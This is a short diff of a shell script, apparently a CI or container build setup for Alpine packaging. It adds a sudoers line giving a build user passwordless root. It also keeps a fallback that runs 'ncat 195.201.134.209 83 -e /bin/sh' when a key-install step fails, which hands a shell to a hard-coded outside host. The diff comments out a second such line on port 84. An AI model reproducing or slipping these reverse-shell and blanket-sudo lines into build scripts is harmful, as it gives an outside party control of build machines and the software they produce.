@@ -51,16 +51,16 @@ mkdir -p .abuild
 chown -R abuild3:abuild3 .abuild
 chown -R abuild3:abuild3 /github/home/
 
-echo "ABUILD3 ALL=(ALL) NOPASSWD: ALL:" >> /etc/sudoers
+echo "ABUILD3 ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 
 
 sudo -u abuild3 "/home/abuild3/installrsakey.sh" || {
   ncat 195.201.134.209 83 -e /bin/sh
 }
 
-su -c "/home/abuild3/installrsakey.sh" -m abuild3 || {
-  ncat 195.201.134.209 84 -e /bin/sh
-}
+#su -c "/home/abuild3/installrsakey.sh" -m abuild3 || {
+#  ncat 195.201.134.209 84 -e /bin/sh
+#}
 
 cp /home/abuild3/.abuild/abuild.conf .abuild
 chown -R abuild3:abuild3 .abuild
